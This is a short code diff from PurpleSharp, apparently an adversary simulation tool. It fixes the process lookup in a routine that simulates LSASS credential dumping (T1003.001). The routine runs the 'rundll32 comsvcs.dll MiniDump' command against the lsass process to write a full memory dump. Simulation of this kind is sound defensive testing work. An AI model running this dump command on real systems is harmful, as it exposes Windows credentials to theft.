@@ -206,9 +206,9 @@ namespace PurpleSharp.Simulations
             logger.SimulationHeader("T1003.001");
             try
             {
-                Process proc = Process.GetProcessesByName("lsass.exe")[0];
+                Process proc = Process.GetProcessesByName("lsass")[0];
                 logger.TimestampInfo(String.Format("Process {0}.exe with PID:{1}", proc.ProcessName, proc.Id));
-                ExecutionHelper.StartProcessApi("", String.Format("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {0} C:\\ProgramData\\lsass.dmp full", proc.Id), logger);
+                ExecutionHelper.StartProcessApi("", String.Format("rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump {0} lsass.dmp full", proc.Id), logger);
                 logger.SimulationFinished();
             }
             catch (Exception ex)
